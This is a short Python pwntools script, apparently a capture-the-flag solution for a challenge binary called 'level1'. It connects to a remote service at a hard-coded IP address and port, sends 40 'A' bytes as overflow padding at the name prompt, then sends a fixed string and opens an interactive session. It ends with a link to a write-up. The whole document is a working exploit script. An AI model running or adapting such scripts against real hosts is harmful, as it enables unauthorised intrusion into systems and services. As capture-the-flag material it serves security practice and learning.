from pwn import *

context.binary = exe = ELF('./level1',checksec=False)

p = remote ('54.169.55.172',1024)

p.sendlineafter(b'name: ', b'A'*40)


payload = 'w3Lc0m37iS'

p.sendafter(b':))))',payload)

p.interactive()
#https://hackmd.io/@akatsukii/ryw4Br8pj
